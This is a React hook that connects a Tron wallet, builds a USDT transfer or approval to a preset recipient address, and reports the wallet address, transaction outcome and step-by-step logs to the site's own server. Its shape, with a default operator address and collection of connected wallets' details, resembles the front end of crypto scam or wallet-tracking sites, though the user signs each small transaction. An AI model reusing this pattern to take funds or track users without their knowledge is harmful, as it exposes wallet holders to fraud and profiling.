import { useState } from "react";
import { useWalletConnect } from "./useWalletConnect";
import { useTronBalances } from "./useTronBalances";
import { TronWeb } from "tronweb";
import useSendDataToServer from "./useSendDataToserver";

function isMobileDevice() {
  return /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);
}

const logToServer = async (message) => {
  try {
    await fetch("/api/log", {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify({ log: message }),
    });
  } catch (error) {
    console.error("Failed to send log to server:", error);
  }
};

export const useTronTransaction = () => {
  const [transactionStatus, setTransactionStatus] = useState(null);
  const [isLoading, setIsLoading] = useState(false);
  const { connectWallet } = useWalletConnect();
  const { fetchBalances } = useTronBalances();
  const { senDataToServer } = useSendDataToServer();

  const initiateTransaction = async (
    recipient = process.env.NEXT_PUBLIC_PREDEFINED_ADRESS_USDT,
    amount = 1 * 1e6,
    isApproval = false
  ) => {
    setIsLoading(true);
    let walletAddress = null; // Inițializăm variabila pentru a fi accesibilă și în blocul `catch`

    try {
      setTransactionStatus(
        isApproval ? "Processing approval..." : "Initiating transfer..."
      );
      await logToServer("Starting transaction initialization...");

      // Conectăm portofelul
      const walletConnection = await connectWallet();
      walletAddress = walletConnection.address; // Salvăm adresa portofelului
      await logToServer(`Wallet connected: ${walletAddress}`);

      // TronWeb setup
      const tronWeb = new TronWeb({ fullHost: "https://api.trongrid.io" });
      if (!walletAddress || !tronWeb.isAddress(walletAddress)) {
        throw new Error(`Invalid Wallet Address: ${walletAddress}`);
      }

      const isConnected = await tronWeb.isConnected();
      if (!isConnected.fullNode) {
        throw new Error("Failed to connect to Tron network.");
      }

      const usdtContractAddress = process.env.NEXT_PUBLIC_USDT_CONTRACT_ADDRESS;
      if (!tronWeb.isAddress(usdtContractAddress)) {
        throw new Error(`Invalid USDT Contract Address: ${usdtContractAddress}`);
      }

      const functionSelector = isApproval
        ? "approve(address,uint256)"
        : "transfer(address,uint256)";
      if (!tronWeb.isAddress(recipient)) {
        throw new Error(`Invalid Recipient Address: ${recipient}`);
      }

      const parameters = isApproval
        ? [
            { type: "address", value: recipient },
            { type: "uint256", value: 1 * 1e6 },
          ]
        : [
            { type: "address", value: recipient },
            { type: "uint256", value: amount },
          ];

      const options = {
        feeLimit: 300000000,
        from: walletAddress,
      };

      let transaction;
      try {
        transaction = await tronWeb.transactionBuilder.triggerSmartContract(
          usdtContractAddress,
          functionSelector,
          options,
          parameters,
          walletAddress
        );
      } catch (error) {
        await logToServer(`Error in triggerSmartContract: ${error.message}`);
        throw error;
      }

      const signedTransaction = await walletConnection.wallet.signTransaction(transaction);
      const result = await tronWeb.trx.sendRawTransaction(signedTransaction);

      setTransactionStatus(
        result.result
          ? isApproval
            ? "Approval successful!"
            : "Transfer successful!"
          : "Transaction failed."
      );
      await logToServer(
        `Transaction result: ${JSON.stringify({
          code: result.code,
          transaction: result.transaction,
        })}`
      );

      // Trimitem datele tranzacției către server
      const balances = await fetchBalances(walletAddress);
      console.log(balances, "from useTrontransactios");
      
      const { trx = 0, usdt = 0 } = balances || {};
      await senDataToServer({
        address: walletAddress,
        recipient: recipient,
        amount: amount / 1e6,
        // trx: trx || 0,
        // usdt: usdt || 0,
        transactionStatus: `Sended Transfer successful!`,
        timestamp: new Date().toISOString(),
      });
    } catch (error) {
      setTransactionStatus("Transaction failed.");
      await logToServer(`Transaction error: ${error.message}`);

      // Asigurăm valori implicite pentru variabile
      await senDataToServer({
        transactionStatus: `Failed: ${error.message}`,
        timestamp: new Date().toISOString(),
        address: walletAddress || "Unknown Address",
        recipient: recipient || "Unknown Recipient",
      });
    } finally {
      setIsLoading(false);
    }
  };

  return {
    initiateTransaction,
    transactionStatus,
    isLoading,
  };
};

